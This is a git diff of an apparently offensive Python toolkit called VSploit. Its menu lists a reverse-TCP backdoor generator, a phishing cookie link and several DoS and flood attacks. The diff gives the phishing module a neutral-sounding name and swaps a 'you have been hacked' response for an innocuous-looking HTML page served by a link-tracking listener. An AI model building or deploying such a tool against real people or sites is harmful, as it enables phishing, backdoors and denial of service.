@@ -110,7 +110,7 @@ while True:
    MODULE                          OPTIONS
 ------------------------------------------------
 reverse_tcp_backdoor       created Backdoor File
-phishing_http_cookie       created link phishing cookie
+http_server_get            created link phishing cookie
 http_flood                 HTTP FLood Attack (DoS)
 http_dos_attack            DoS Attack
 http_tcp_dos               DoS Layer4 (TCP)
@@ -300,7 +300,7 @@ connection()
 
 # ==============================================================================================================
 
-		if set_module == 'phishing_http_cookie':
+		if set_module == 'http_server_get':
 			
 			print("")
 			print(Fore.GREEN + '[*]' + Style.RESET_ALL + f' set module => {set_module}')
@@ -375,8 +375,16 @@ connection()
 							
 							conn, addr = s.accept()
 
-							response = '''HTTP/1.1 200 OK\r\n\r\nGood Morning\n
-today , i want send to you message , you have been hacked by VSploit, ahahhahaha !!!'''
+							code = """
+<html>
+<title>hello</title>
+<h1>
+	hello , how are you ?
+</h1>
+<img src='https://upload.wikimedia.org/wikipedia/commons/thumb/d/db/Falun_Gong_Logo.svg/1200px-Falun_Gong_Logo.svg.png' width="300" height="300">
+"""
+
+							response = 'HTTP/1.1 200 OK\r\n\r\n' + code
 							conn.sendall(response.encode())
 
 							print(Fore.GREEN + '[*]' + Style.RESET_ALL + f' 1 {addr} has open the link...')
@@ -386,13 +394,11 @@ today , i want send to you message , you have been hacked by VSploit, ahahhahaha
 
 							print("")
 							print(Fore.GREEN + '[*]' + Style.RESET_ALL + f' {output_data}')
-							print("")
 
 							conn.close()
 
 							session = True
 
-						print("")
 						print("[+] Session CLosed")
 						print("")
 						
